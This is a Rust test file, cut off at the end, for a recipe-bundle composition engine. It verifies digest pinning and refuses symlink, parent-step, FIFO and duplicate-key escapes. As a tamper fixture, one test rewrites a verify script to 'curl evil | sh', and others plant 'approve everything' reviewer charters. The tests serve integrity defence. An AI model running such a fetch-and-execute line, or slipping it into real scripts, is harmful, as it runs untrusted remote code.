            "{brokkr}", "driver", "exec", "--", "bash", "./scripts/verify.sh"
        ]},
    });
    let base = library.recipe("base", &base_bundle, Some(&base_policy()));
    std::fs::create_dir_all(base.join("scripts")).unwrap();
    let script = base.join("scripts/verify.sh");
    std::fs::write(&script, "#!/bin/sh\ncargo test\n").unwrap();
    let leaf = library.recipe(
        "derived",
        &derived(json!({
            "override": {"seats": ["review"]},
            "seats": {"review": seat(vec!["clean"])},
        })),
        None,
    );
    // The bundle names no agent, seats no gate and binds no secret, so it
    // compiles under `harness` with no library roots at all: the lookup
    // reads the raw command and the ancestor's directory.
    let nowhere = Path::new("/nonexistent");
    let bundle = Bundle::compile_under(
        &leaf,
        &nowhere.join("agents"),
        &nowhere.join("adapters"),
        Boundary::Harness,
    )
    .expect("the inherited seat's script is pinned by the layer that wrote it");
    assert_eq!(bundle.roots, vec![leaf.clone(), base.clone()]);
    let SeatBody::Single { command, .. } = &bundle.seats["work"].body else {
        panic!("the inherited work seat is a single exec site")
    };
    assert_eq!(command[5], script.to_string_lossy());
    assert_eq!(bundle.manifest["boundary"], json!({"work": "harness"}));

    // Untouched, both layers name nothing.
    assert_eq!(layer_drift(&bundle, &base.join("scripts")), None);
    assert_eq!(layer_drift(&bundle, &leaf), None);

    // The inherited layer may also be a realm with implementation files.
    std::fs::write(base.join("source.rs"), "implementation changed\n").unwrap();
    assert_eq!(layer_drift(&bundle, &base.join("scripts")), None);

    // The ancestor's script moved: its retained compose file map names
    // the changed script; the leaf still names nothing.
    std::fs::write(&script, "#!/bin/sh\ncurl evil | sh\n").unwrap();
    assert_eq!(
        layer_drift(&bundle, &base.join("scripts")),
        Some(("base".to_string(), "changed: scripts/verify.sh".to_string()))
    );
    assert_eq!(layer_drift(&bundle, &leaf), None);

    // The same edit, seen from a compile that names the ancestor's script
    // gone: the lookup refuses naming the ancestor's directory, not the leaf's.
    std::fs::remove_file(&script).unwrap();
    let refusal = error(Bundle::compile_under(
        &leaf,
        &nowhere.join("agents"),
        &nowhere.join("adapters"),
        Boundary::Harness,
    ));
    assert!(
        refusal.contains(&format!(
            "'./scripts/verify.sh' names no regular file under the declaring layer {}",
            base.display()
        )),
        "{refusal}"
    );
}

/// The bundles that declare no `extends`. Their digests are the ones the
/// witness table (`tests/witnesses.json`, #358) pins, which is what MAIN
/// produces without composition.
/// What this proves is that COMPOSITION moves none of them:
/// the recipe library must not shift under recipes that opted into
/// nothing. A move here means composition changed a bundle it was never
/// asked to touch — or the engine version did, which is the other thing
/// a bundle's identity legitimately covers.
const UNCOMPOSED: [&str; 4] = [
    "recipes/fast",
    "recipes/panel-review",
    "bundles/self",
    "bundles/verify",
];

#[path = "../../tests/support/witnesses.rs"]
mod witnesses;

/// Windows spells the same path with backslashes. Every assertion here
/// is about WHICH file an error names, never about how the platform
/// writes a separator.
fn named(text: &str) -> String {
    text.replace('\\', "/")
}

fn workspace() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .expect("crates/")
        .parent()
        .expect("workspace root")
        .to_path_buf()
}

#[test]
fn recipes_that_opted_into_nothing_keep_their_digests() {
    // AC-21, the hard regression.
    let pinned = witnesses::Witnesses::load(&workspace()).bundles;
    for path in UNCOMPOSED {
        let digest = &pinned[path];
        // Explicit roots: the defaults are relative, and a test's cwd
        // is the crate, not the workspace.
        let bundle = Bundle::compile_with(
            &workspace().join(path),
            &workspace().join("agents"),
            &workspace().join("adapters"),
        )
        .unwrap();
        assert_eq!(&bundle.manifest_digest(), digest, "{path} digest moved");
        assert_eq!(bundle.chain.len(), 0, "{path} composed nothing");
        assert_eq!(bundle.roots, vec![bundle.dir.clone()], "{path} is one root");
        for key in bundle.manifest["files"].as_object().unwrap().keys() {
            assert!(!key.starts_with("@compose/"), "{path} emitted {key}");
        }
    }
}

#[test]
fn the_chain_rides_in_the_manifest_and_a_base_change_moves_the_digest() {
    let library = Library::new();
    library.recipe("base", &base_bundle(), Some(&base_policy()));
    library.recipe(
        "middle",
        &json!({"name": "middle", "extends": "base"}),
        None,
    );
    let leaf = library.recipe("leaf", &json!({"name": "leaf", "extends": "middle"}), None);

    // AC-24: the chain is readable back as an ordered name/digest list,
    // nearest ancestor first.
    let bundle = Bundle::compile(&leaf).unwrap();
    let files = bundle.manifest["files"].as_object().unwrap();
    let entries: Vec<(&String, &Value)> = files
        .iter()
        .filter(|(key, _)| key.starts_with("@compose/"))
        .collect();
    assert_eq!(entries.len(), 2);
    assert_eq!(entries[0].0, "@compose/0000/middle");
    assert_eq!(entries[1].0, "@compose/0001/base");
    assert_eq!(entries[0].1, &json!(bundle.chain[0].digest));
    assert_eq!(entries[1].1, &json!(bundle.chain[1].digest));
    assert_eq!(bundle.chain[0].dir, library.path().join("middle"));

    // AC-23: changing a base changes the digest of everything derived
    // from it — including through an intermediate layer, because an
    // ancestor's digest covers its own ancestors' digests.
    let before = bundle.manifest_digest();
    let before_middle = bundle.chain[0].digest.clone();
    std::fs::write(
        library.path().join("base/roles/role.md"),
        "# a different base role\n",
    )
    .unwrap();
    let after = Bundle::compile(&leaf).unwrap();
    assert_ne!(after.manifest_digest(), before);
    assert_ne!(after.chain[0].digest, before_middle);

    // AC-25: the reserved namespace cannot be forged from disk.
    std::fs::create_dir_all(library.path().join("leaf/@compose/0000")).unwrap();
    std::fs::write(library.path().join("leaf/@compose/0000/middle"), "fake").unwrap();
    let refusal = error(Bundle::compile(&leaf));
    assert!(
        refusal.contains("reserved '@compose/' namespace"),
        "{refusal}"
    );
}

#[test]
fn a_composed_bundles_manifest_is_pinned() {
    // Decision 0041 ruling 7 retires the crew recipes into triage cases;
    // night-shift remains a recipe because its limits and dsh lane differ.
    let compiled = |path: &str| {
        Bundle::compile_with(
            &workspace().join(path),
            &workspace().join("agents"),
            &workspace().join("adapters"),
        )
        .unwrap()
    };
    let triage = compiled("recipes/triage");
    assert_eq!(triage.chain.len(), 1);
    assert_eq!(triage.chain[0].reached_as.as_deref(), Some("fast"));
    assert_eq!(triage.chain[0].name, "fast");
    assert_eq!(
        triage.manifest["files"]["@compose/0000/fast"],
        json!(triage.chain[0].digest)
    );
    assert_eq!(
        triage.manifest_digest(),
        // Decision 0042's five SDD phases and every office they resolve
        // are bundle identity; the value is the witness table's pin.
        witnesses::Witnesses::load(&workspace()).bundles["recipes/triage"],
        "the five-phase SDD sequence and every resolved office are pinned"
    );

    let night = compiled("recipes/night-shift");
    assert_eq!(
        night
            .chain
            .iter()
            .map(|a| a.name.as_str())
            .collect::<Vec<_>>(),
        ["triage", "fast"]
    );
    assert!(night.manifest["files"]
        .get("@compose/0000/triage")
        .is_some());
}

/// Symlinks are a unix concept here; Windows has no equivalent to
/// create in a test without elevation.
#[cfg(unix)]
#[test]
fn a_base_reached_through_a_symlink_out_of_the_library_is_refused() {
    // A composed base is read for composition AND bind-mounted
    // read-only into every confined seat, so a link pointing outside
    // the library would widen that mount. `brokkr recipes add` already
    // refuses symlinks; composition applies the same rule.
    let library = Library::new();
    library.recipe("base", &base_bundle(), Some(&base_policy()));
    let outside = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(outside.path().join("elsewhere/roles")).unwrap();
    std::fs::write(
        outside.path().join("elsewhere/bundle.json"),
        serde_json::to_vec(&base_bundle()).unwrap(),
    )
    .unwrap();
    std::os::unix::fs::symlink(
        outside.path().join("elsewhere"),
        library.path().join("linked"),
    )
    .unwrap();
    let via_link = library.recipe(
        "viaLink",
        &json!({"name": "via-link", "extends": "linked"}),
        None,
    );
    let message = error(resolve(&via_link));
    assert!(
        message.contains("resolves outside the library"),
        "{message}"
    );
}

#[test]
fn a_bases_directory_name_and_declared_name_are_both_recorded() {
    // A directory may legitimately declare a different name than the
    // one it is extended by — `brokkr recipes add --name` installs
    // exactly that. So it is RECORDED, not refused: the chain carries
    // both, and the manifest key names both, so a directory can never
    // answer to a name it does not declare.
    let library = Library::new();
    library.recipe("base", &base_bundle(), Some(&base_policy()));
    library.recipe(
        "innocuous",
        &json!({"name": "sdd", "extends": "base"}),
        None,
    );
    let derived = library.recipe(
        "derived",
        &json!({"name": "derived", "extends": "innocuous"}),
        None,
    );
    let resolved = resolve(&derived).expect("a renamed directory composes");
    let base_layer = resolved
        .chain
        .iter()
        .find(|ancestor| ancestor.name == "sdd")
        .expect("the renamed base is in the chain");
    assert_eq!(base_layer.reached_as.as_deref(), Some("innocuous"));
}

/// Finding M2: a recipe layer's requests are read from its SOURCE BYTES.
/// An ordinary JSON map keeps the last copy of a repeated key, so a
/// requirement written before a want under one name — or a second
/// `capabilities` field, a later `{}` included — reached the capability
/// pass already weakened. Each repetition is refused where the layer is
/// read, at every site form and in an ancestor whose seat a leaf replaces,
/// naming the layer's file, the key and where the parser stood. The
/// fixtures are raw text: `json!` would erase the duplicate first.
#[test]
fn a_request_key_written_twice_in_a_recipe_layer_is_refused_from_its_bytes() {
    // One seat body with `ASKS` where its requests are written, always
    // followed by another member, so the parser stands just past the
    // second copy's value in every form.
    const SINGLE: &str = r#"{ASKS,"results":["complete"],"role":"roles/role.md","driver":{"command":["./drive","plain"]}}"#;
    let forms = [
        ("an ordinary seat", SINGLE.to_string()),
        (
            "a panel member",
            r#"{"results":["complete"],"panel":{"one":SINGLE},"aggregate":"unanimous-pass"}"#
                .replace("SINGLE", SINGLE),
        ),
        (
            "a sequence step",
            r#"{"results":["complete"],"sequence":[SINGLE]}"#.replace("SINGLE", SINGLE),
        ),
        (
            "a selected case",
            r#"{"results":["complete"],"select":"strategy","cases":{"engine":SINGLE}}"#
                .replace("SINGLE", SINGLE),
        ),
    ];
    // What is written, the key refused, and the second copy with its value.
    let repetitions = [
        (
            r#""capabilities":{"web-search":"requires","web-search":"wants","web-fetch":"wants"}"#,
            "web-search",
            r#""web-search":"wants""#,
        ),
        (
            r#""capabilities":{"web-search":"wants","web-search":"requires","web-fetch":"wants"}"#,
            "web-search",
            r#""web-search":"requires""#,
        ),
        (
            r#""capabilities":{"web-search":"requires","web-search":"requires","web-fetch":"wants"}"#,
            "web-search",
            r#","web-search":"requires""#,
        ),
        (
            r#""capabilities":{"web-search":"requires"},"capabilities":{}"#,
            "capabilities",
            r#""capabilities":{}"#,
        ),
        (
            r#""capabilities":{},"capabilities":{"web-search":"requires"}"#,
            "capabilities",
            r#","capabilities":{"web-search":"requires"}"#,
        ),
    ];
    let once = r#""capabilities":{"web-search":"requires","web-fetch":"wants"}"#;
    let review =
        r#"{"results":["clean"],"role":"roles/role.md","driver":{"command":["./drive","plain"]}}"#;
    let bundle = |work: &str| {
        r#"{"name":"base","policy":"policy.json","seats":{"work":WORK,"review":REVIEW}}"#
            .replace("WORK", work)
            .replace("REVIEW", review)
    };
    for (form, body) in &forms {
        for (asks, key, second) in repetitions {
            for inherited in [false, true] {
                let library = Library::new();
                let written = library.recipe("base", &base_bundle(), Some(&base_policy()));
                let text = bundle(&body.replace("ASKS", asks));
                std::fs::write(written.join("bundle.json"), &text).unwrap();
                // Inherited: the leaf REPLACES the seat, and the ancestor's
                // bytes are refused all the same — an override hides nothing.
                let leaf = match inherited {
                    false => written.clone(),
                    true => library.recipe(
                        "derived",
                        &derived(json!({"override": {"seats": ["work"]},
                                        "seats": {"work": seat(vec!["complete"])}})),
                        None,
                    ),
                };
                let column = text.rfind(second).unwrap() + second.len();
                // What composing said, or what it composed: a reader that
                // keeps the last copy fails HERE, showing what it kept.
                let said = match resolve(&leaf) {
                    Ok(resolved) => format!("composed {}", resolved.seats["work"]),
                    Err(refusal) => refusal.to_string(),
                };
                assert_eq!(
                    said,
                    format!(
                        "bundle: {}: key '{key}' is written twice at line 1 column {column}",
                        written.join("bundle.json").display()
                    ),
                    "{form}, inherited: {inherited}, {asks}"
                );
                // The control: the same layer with each key once composes.
                std::fs::write(
                    written.join("bundle.json"),
                    bundle(&body.replace("ASKS", once)),
                )
                .unwrap();
                resolve(&leaf).unwrap_or_else(|error| panic!("{form}: {error}"));
            }
        }
    }
}

// ------------------------------------------------ H4: active inputs

/// What a compile said, or the identity it compiled to — so a fence that
/// is missing fails at the equality that expects its refusal.
fn said(leaf: &Path) -> String {
    match Bundle::compile(leaf) {
        Ok(bundle) => format!("compiled to {}", bundle.manifest_digest()),
        Err(refusal) => refusal.to_string(),
    }
}

fn role_refusal(layer: &Path, reference: &str, top: &str) -> String {
    format!(
        "{}: seat 'work' names role '{reference}', which stands under '{top}' — a top-level \
         name the bundle's file walk does not pin, because it holds operator configuration. A \
         charter there could change what the seat is told without moving the bundle's \
         identity, so it is refused; move it to a path the bundle pins, such as 'roles/' \
         (decision 0066 ruling 5)",
        layer.join("bundle.json").display()
    )
}

fn policy_refusal(layer: &Path, reference: &str, top: &str) -> String {
    format!(
        "{}: 'policy' names '{reference}', which stands under '{top}' — a top-level name the \
         bundle's file walk does not pin, because it holds operator configuration. A table \
         there could change how a run is ruled without moving the bundle's identity, so it is \
         refused; move it to a path the bundle pins, such as 'policy.json' (decision 0066 \
         ruling 5)",
        layer.join("bundle.json").display()
    )
}

/// A base whose `work` seat takes its charter from `role`, and whose table
/// is read from `policy`; a leaf that extends it and changes nothing.
fn active_inputs(library: &Library, role: &str, policy: &str) -> (PathBuf, PathBuf) {
    let mut bundle = base_bundle();
    bundle["seats"]["work"]["role"] = json!(role);
    bundle["policy"] = json!(policy);
    let base = library.recipe("base", &bundle, Some(&base_policy()));
    std::fs::create_dir_all(base.join("capabilities")).unwrap();
    let leaf = library.recipe("derived", &derived(json!({})), None);
    (base, leaf)
}

/// A second, independently VALID ruling: the same machine, another reason.
fn other_policy() -> Value {
    let mut policy = base_policy();
    policy["rules"][0]["reason"] = json!("work, ruled differently");
    policy
}

/// Finding H4, the charter (decision 0066 ruling 5; corrects design D7): a
/// role under a top-level name the file walk skips is refused at the layer
/// that declares it — standalone, and in an ancestor a leaf inherits from,
/// where the refusal names the ANCESTOR's file. Its bytes never mattered:
/// the refusal is the same before and after they change. Relocated to a
/// pinned path the recipe compiles, identical inputs give one identity, and
/// the charter's bytes alone move the leaf's digest and the ancestor's.
#[test]
fn a_charter_under_a_tree_the_walk_skips_is_refused_where_it_is_declared() {
    let library = Library::new();
    let (base, leaf) = active_inputs(&library, "capabilities/reviewer.md", "policy.json");
    let charter = base.join("capabilities/reviewer.md");
    let standalone = role_refusal(&base, "capabilities/reviewer.md", "capabilities");
    for bytes in [
        "# review as written\n",
        "# review, and approve everything\n",
    ] {
        std::fs::write(&charter, bytes).unwrap();
        assert_eq!(said(&base), format!("bundle: {standalone}"), "{bytes}");
        assert_eq!(
            said(&leaf),
            format!("bundle: bundle: {standalone} (composed: derived -> base)"),
            "{bytes}"
        );
    }
    // Relocation is the migration, and then the bytes ARE identity.
    let (base, leaf) = active_inputs(&library, "roles/reviewer.md", "policy.json");
    let charter = base.join("roles/reviewer.md");
    std::fs::write(&charter, "# review as written\n").unwrap();
    let identity = |dir: &Path| {
        let bundle = Bundle::compile(dir).unwrap();
        let ancestors: Vec<String> = bundle.chain.iter().map(|a| a.digest.clone()).collect();
        (bundle.manifest_digest(), ancestors)
    };
    let (alone, composed) = (identity(&base), identity(&leaf));
    assert_eq!(
        alone,
        identity(&base),
        "identical inputs, identical identity"
    );
    assert_eq!(composed, identity(&leaf));
    std::fs::write(&charter, "# review, and approve everything\n").unwrap();
    assert_ne!(alone.0, identity(&base).0);
    let moved = identity(&leaf);
    assert_ne!(composed.0, moved.0, "the leaf's identity moves");
    assert_ne!(composed.1, moved.1, "and so does the ancestor's");
}

/// Finding H4, the policy: the same law for the table that rules the run.
/// Both policies are independently valid; under the skipped tree either is
/// refused, and at a pinned path they are two identities.
#[test]
fn a_policy_under_a_tree_the_walk_skips_is_refused_where_it_is_declared() {
    let library = Library::new();
    let (base, leaf) = active_inputs(&library, "roles/role.md", "capabilities/policy.json");
    let standalone = policy_refusal(&base, "capabilities/policy.json", "capabilities");
    for policy in [base_policy(), other_policy()] {
        std::fs::write(
            base.join("capabilities/policy.json"),
            serde_json::to_vec(&policy).unwrap(),
        )
        .unwrap();
        assert_eq!(said(&base), format!("bundle: {standalone}"));
        // The leaf declares no table of its own, and one that did would
        // hide nothing: every layer's own reference is judged.
        assert_eq!(said(&leaf), format!("bundle: {standalone}"));
    }
    let tabled = library.recipe(
        "tabled",
        &json!({"name": "tabled", "extends": "base", "policy": "policy.json"}),
        Some(
            &json!({"rules": [{"id": "EXTRA", "from": "work", "result": "blocked",
                                "next": "work", "reason": "a leaf's own table"}]}),
        ),
    );
    assert_eq!(said(&tabled), format!("bundle: {standalone}"));
    // At a pinned path the two rulings are two identities, alone and composed.
    let (base, leaf) = active_inputs(&library, "roles/role.md", "policy.json");
    let digests = |policy: &Value| {
        std::fs::write(
            base.join("policy.json"),
            serde_json::to_vec(policy).unwrap(),
        )
        .unwrap();
        let composed = Bundle::compile(&leaf).unwrap();
        (
            Bundle::compile(&base).unwrap().manifest_digest(),
            composed.manifest_digest(),
            composed.chain[0].digest.clone(),
        )
    };
    let first = digests(&base_policy());
    assert_eq!(first, digests(&base_policy()), "identical inputs");
    let second = digests(&other_policy());
    assert_ne!(first.0, second.0);
    assert_ne!(first.1, second.1, "the leaf's identity moves");
    assert_ne!(first.2, second.2, "and so does the ancestor's");
}

/// Finding H4, the other way out of the file map: a role or a table written
/// OUT of its layer — `../shared/…` — is pinned by nothing, since an inline
/// role has no pin but the walk. Refused where it is declared, standalone
/// and inherited, before and after its bytes change.
#[test]
fn an_active_input_written_out_of_its_layer_is_refused_where_it_is_declared() {
    let outside = "which stands outside the layer's own directory, where the bundle's file walk \
                   never reaches";
    let library = Library::new();
    std::fs::create_dir_all(library.path().join("shared")).unwrap();
    let (base, leaf) = active_inputs(&library, "../shared/role.md", "policy.json");
    let expected = format!(
        "{}: seat 'work' names role '../shared/role.md', {outside}. A charter there could \
         change what the seat is told without moving the bundle's identity, so it is refused; \
         move it to a path the bundle pins, such as 'roles/' (decision 0066 ruling 5)",
        base.join("bundle.json").display()
    );
    for bytes in ["# as written\n", "# approve everything\n"] {
        std::fs::write(library.path().join("shared/role.md"), bytes).unwrap();
        assert_eq!(said(&base), format!("bundle: {expected}"), "{bytes}");
        assert_eq!(
            said(&leaf),
            format!("bundle: bundle: {expected} (composed: derived -> base)"),
            "{bytes}"
        );
    }
    let (base, leaf) = active_inputs(&library, "roles/role.md", "../shared/policy.json");
    let expected = format!(
        "bundle: {}: 'policy' names '../shared/policy.json', {outside}. A table there could \
         change how a run is ruled without moving the bundle's identity, so it is refused; \
         move it to a path the bundle pins, such as 'policy.json' (decision 0066 ruling 5)",
        base.join("bundle.json").display()
    );
    for policy in [base_policy(), other_policy()] {
        std::fs::write(
            library.path().join("shared/policy.json"),
            serde_json::to_vec(&policy).unwrap(),
        )
        .unwrap();
        assert_eq!(said(&base), expected);
        assert_eq!(said(&leaf), expected);
    }
}

/// Second council H5: A SYMLINK FOLLOWED BY A PARENT STEP ESCAPES THE
/// IDENTITY THE FIRST REPAIR BUILT.
///
/// With `base/alias -> ../outside/child`, the chief compiled
/// `alias/../charter.md` and `alias/../policy.json` — standalone and
/// inherited — then changed the charter's bytes and the policy's severity
/// and watched every manifest digest stay identical in all four cases,
/// with `charter_drift` returning `None`. The lexical fold answered for a
/// file it had never looked at: it folded the pair away and reported
/// `base/charter.md`, which the walk does pin, while the file the compile
/// read and the driver rendered was `outside/charter.md`, which nothing
/// pins.
///
/// A `..` step is never a path the walk takes, so it is refused, and every
/// digest the finding turned on is a digest of a bundle that no longer
/// compiles. Rebuild unit 16 (operator ruling 3) revokes the old control
/// here: a link that points out of the layer under its OWN name was walked,
/// pinned by content and admitted, and it is now refused like the escape.
#[cfg(unix)]
#[test]
fn a_symlink_and_a_parent_step_cannot_carry_an_active_input_out_of_the_pin() {
    use std::os::unix::fs::symlink;
    let library = Library::new();
    let (base, leaf) = active_inputs(&library, "roles/role.md", "policy.json");
    // The chief's tree: a link inside the layer to a directory outside it,
    // whose PARENT holds the files the escape reaches.
    let outside = library.path().join("outside");
    std::fs::create_dir_all(outside.join("child")).unwrap();
    std::fs::write(outside.join("charter.md"), "# outside as written\n").unwrap();
    std::fs::write(
        outside.join("policy.json"),
        serde_json::to_vec(&base_policy()).unwrap(),
    )
    .unwrap();
    symlink("../outside/child", base.join("alias")).unwrap();
    let step = |what: &str, reference: &str, tail: &str| {
        format!(
            "{}: {what} '{reference}', which reaches its file through a '..' step — never a \
             path the bundle's file walk takes, so a link earlier in it can put the file a \
             reader opens outside everything the walk pinned. {tail} (decision 0066 ruling 5)",
            base.join("bundle.json").display()
        )
    };
    let charter_tail = "A charter there could change what the seat is told without moving the \
                        bundle's identity, so it is refused; move it to a path the bundle pins, \
                        such as 'roles/'";
    let table_tail = "A table there could change how a run is ruled without moving the bundle's \
                      identity, so it is refused; move it to a path the bundle pins, such as \
                      'policy.json'";
    // Standalone and inherited, charter and table, before and after the
    // bytes outside change: the refusal never depended on them.
    for bytes in ["# outside as written\n", "# approve everything\n"] {
        std::fs::write(outside.join("charter.md"), bytes).unwrap();
        let mut bundle = base_bundle();
        bundle["seats"]["work"]["role"] = json!("alias/../charter.md");
        let dir = library.recipe("base", &bundle, Some(&base_policy()));
        let expected = step(
            "seat 'work' names role",
            "alias/../charter.md",
            charter_tail,
        );
        assert_eq!(said(&dir), format!("bundle: {expected}"), "{bytes}");
        assert_eq!(
            said(&leaf),
            format!("bundle: bundle: {expected} (composed: derived -> base)"),
            "{bytes} inherited"
        );
    }
    for severity in ["r", "ruled differently"] {
        let mut table = base_policy();
        table["rules"][0]["reason"] = json!(severity);
        std::fs::write(
            outside.join("policy.json"),
            serde_json::to_vec(&table).unwrap(),
        )
        .unwrap();
        let mut bundle = base_bundle();
        bundle["policy"] = json!("alias/../policy.json");
        let dir = library.recipe("base", &bundle, Some(&base_policy()));
        let expected = step("'policy' names", "alias/../policy.json", table_tail);
        assert_eq!(said(&dir), format!("bundle: {expected}"), "{severity}");
        // A table is read while the layers are, before anything is
        // composed, so the ancestor's own refusal is what a leaf gets.
        assert_eq!(
            said(&leaf),
            format!("bundle: {expected}"),
            "{severity} inherited"
        );
    }
    // The old control, revoked: a link under its own name that points out
    // of the layer was pinned by content and admitted. It is refused now,
    // before and after the bytes it reaches change.
    symlink("../../outside/charter.md", base.join("roles/linked.md")).unwrap();
    let mut bundle = base_bundle();
    bundle["seats"]["work"]["role"] = json!("roles/linked.md");
    let dir = library.recipe("base", &bundle, Some(&base_policy()));
    for bytes in ["# contained target\n", "# edited through the link\n"] {
        std::fs::write(outside.join("charter.md"), bytes).unwrap();
        assert_eq!(
            said(&dir),
            format!("bundle: {}", role_escape(&base, "roles/linked.md", OUTWARD)),
            "{bytes}"
        );
    }
}

// ------------------------------------------ unit 16: bound active inputs

/// The clause a consumed input whose resolved target leaves its layer
/// carries (operator ruling 3).
const OUTWARD: &str = "which resolves through a link to a file outside the layer's own \
                       directory; the walk pins such a link only by the bytes it reaches, so \
                       retargeting it to equal bytes moves nothing, and it is refused rather \
                       than pinned and admitted (operator ruling 3)";

/// The clause a FIFO, device or directory carries.
const NONREGULAR: &str = "which is not a regular file; only a regular file's bytes are read, \
                          hashed and pinned, and a FIFO, device or directory could supply bytes \
                          the walk never hashed";

/// The clause a file replaced between its check and its read carries.
const REPLACED: &str = "which was replaced while it was read: the file the read holds is no \
                        longer the contained target that was checked, so its bytes are not the \
                        ones verified";

/// The whole refusal of `work`'s role, for any clause.
fn role_escape(layer: &Path, reference: &str, place: &str) -> String {
    format!(
        "{}: seat 'work' names role '{reference}', {place}. A charter there could change what \
         the seat is told without moving the bundle's identity, so it is refused; move it to a \
         path the bundle pins, such as 'roles/' (decision 0066 ruling 5)",
        layer.join("bundle.json").display()
    )
}

/// The whole refusal of a layer's table, for any clause.
fn policy_escape(layer: &Path, reference: &str, place: &str) -> String {
    format!(
        "{}: 'policy' names '{reference}', {place}. A table there could change how a run is \
         ruled without moving the bundle's identity, so it is refused; move it to a path the \
         bundle pins, such as 'policy.json' (decision 0066 ruling 5)",
        layer.join("bundle.json").display()
    )
}

/// A FIFO at `path`, made by the host's own tool so no test needs `unsafe`.
fn fifo(path: &Path) {
    let made = std::process::Command::new("mkfifo")
        .arg(path)
        .status()
        .unwrap();
    assert!(made.success(), "mkfifo {}", path.display());
}

/// What compiling `leaf` said while `act` ran once, when a bound read of
/// `watched` reached `stage`: a controlled replacement at a known point.
fn said_replacing(
    leaf: &Path,
    watched: &Path,
    stage: ReadStage,
    act: impl FnOnce() + 'static,
) -> String {
    let watched = watched.to_path_buf();
    let mut act = Some(act);
    READ_HOOK.with(|hook| {
        *hook.borrow_mut() = Some(Box::new(move |at, target| {
            if at == stage && target == watched {
                if let Some(act) = act.take() {
                    act();
                }
            }
        }));
    });
    let said = said(leaf);
    READ_HOOK.with(|hook| *hook.borrow_mut() = None);
    said
}

/// Rebuild unit 16 (16.1, 16.3; operator ruling 3, "It is not pinned and
/// admitted"): two of the four escapes — a role, standalone and inherited —
/// through a link inside the layer whose target stands outside it. Each is
/// refused with EQUAL bytes (the outside file is a byte copy of the layer's
/// own), and again after those bytes change, because what a link reaches is
/// not pinned by where it stands. A directory link that carries a nested
/// path out of the layer is refused the same way. The table's two escapes
/// are their own test, so neither half's red can hide the other's.
#[cfg(unix)]
#[test]
fn a_role_link_out_of_the_layer_is_refused_even_with_equal_bytes() {
    use std::os::unix::fs::symlink;
    for role in ["roles/linked.md", "roles/out/role.md"] {
        let library = Library::new();
        let outside = library.path().join("outside");
        std::fs::create_dir_all(outside.join("roles")).unwrap();
        let (base, leaf) = active_inputs(&library, role, "policy.json");
        symlink("../../outside/roles/role.md", base.join("roles/linked.md")).unwrap();
        symlink("../../outside/roles", base.join("roles/out")).unwrap();
        let expected = role_escape(&base, role, OUTWARD);
        for bytes in ["# base\n", "# approve everything\n"] {
            std::fs::write(outside.join("roles/role.md"), bytes).unwrap();
            assert_eq!(said(&base), format!("bundle: {expected}"), "{role} {bytes}");
            assert_eq!(
                said(&leaf),
                format!("bundle: bundle: {expected} (composed: derived -> base)"),
                "{role} {bytes} inherited"
            );
        }
    }
}

/// Rebuild unit 16 (16.1, 16.3): the table's two escapes, standalone and
/// inherited, through a link whose target stands outside the layer, with
/// two independently valid rulings behind it — the first a byte copy of
/// the layer's own table.
#[cfg(unix)]
#[test]
fn a_table_link_out_of_the_layer_is_refused_even_with_equal_bytes() {
    use std::os::unix::fs::symlink;
    let library = Library::new();
    let outside = library.path().join("outside");
    std::fs::create_dir_all(&outside).unwrap();
    let (base, leaf) = active_inputs(&library, "roles/role.md", "table.json");
    symlink("../outside/policy.json", base.join("table.json")).unwrap();
    let expected = format!("bundle: {}", policy_escape(&base, "table.json", OUTWARD));
    for policy in [base_policy(), other_policy()] {
        std::fs::write(
            outside.join("policy.json"),
            serde_json::to_vec(&policy).unwrap(),
        )
        .unwrap();
        assert_eq!(said(&base), expected);
        assert_eq!(said(&leaf), expected, "inherited");
    }
}

/// Rebuild unit 16 (16.3's controls): a link whose target stands INSIDE
/// its layer is followed. The role and the table compile through links,
/// standalone and inherited; identical inputs keep one identity; and the
/// target's bytes alone move the leaf's digest and the ancestor's.
#[cfg(unix)]
#[test]
fn a_link_inside_the_layer_is_followed_and_its_target_bytes_are_identity() {
    use std::os::unix::fs::symlink;
    let library = Library::new();
    let (base, leaf) = active_inputs(&library, "roles/linked.md", "table.json");
    std::fs::create_dir_all(base.join("tables")).unwrap();
    std::fs::write(base.join("roles/target.md"), "# as written\n").unwrap();
    std::fs::write(
        base.join("tables/policy.json"),
        serde_json::to_vec(&base_policy()).unwrap(),
    )
    .unwrap();
    symlink("target.md", base.join("roles/linked.md")).unwrap();
    symlink("tables/policy.json", base.join("table.json")).unwrap();
    let identity = || {
        let composed = Bundle::compile(&leaf).unwrap();
        (
            Bundle::compile(&base).unwrap().manifest_digest(),
            composed.manifest_digest(),
            composed.chain[0].digest.clone(),
        )
    };
    let first = identity();
    assert_eq!(first, identity(), "identical inputs, one identity");
    std::fs::write(base.join("roles/target.md"), "# approve everything\n").unwrap();
    let charter = identity();
    assert_ne!(first.0, charter.0);
    assert_ne!(first.1, charter.1, "the leaf's identity moves");
    assert_ne!(first.2, charter.2, "and so does the ancestor's");
    std::fs::write(
        base.join("tables/policy.json"),
        serde_json::to_vec(&other_policy()).unwrap(),
    )
    .unwrap();
    let table = identity();
    assert_ne!(charter.0, table.0);
    assert_ne!(charter.1, table.1, "the leaf's identity moves");
    assert_ne!(charter.2, table.2, "and so does the ancestor's");
}

/// Rebuild unit 16 (16.1, 16.2; third council C3): a FIFO supplies no
/// charter and no table. The walk hashes regular files only, so a FIFO's
/// bytes were parsed and never pinned; its kind is refused before any open,
/// so the compile neither reads it nor waits on it, standalone or inherited.
/// A directory named as a table is refused on the same clause. A table that
/// is not there at all is the next test's.
#[cfg(unix)]
#[test]
fn a_fifo_supplies_no_charter_and_no_table() {
    let library = Library::new();
    let (base, leaf) = active_inputs(&library, "roles/pipe.md", "policy.json");
    fifo(&base.join("roles/pipe.md"));
    let expected = role_escape(&base, "roles/pipe.md", NONREGULAR);
    assert_eq!(said(&base), format!("bundle: {expected}"));
    assert_eq!(
        said(&leaf),
        format!("bundle: bundle: {expected} (composed: derived -> base)")
    );
    for (policy, make) in [
        ("pipe.json", fifo as fn(&Path)),
        ("tables", |path: &Path| std::fs::create_dir(path).unwrap()),
    ] {
        let (base, leaf) = active_inputs(&library, "roles/role.md", policy);
        make(&base.join(policy));
        let expected = format!("bundle: {}", policy_escape(&base, policy, NONREGULAR));
        assert_eq!(said(&base), expected, "{policy}");
        assert_eq!(said(&leaf), expected, "{policy} inherited");
    }
}

/// Rebuild unit 16 (16.1; the delta's bounded source, site, kind and
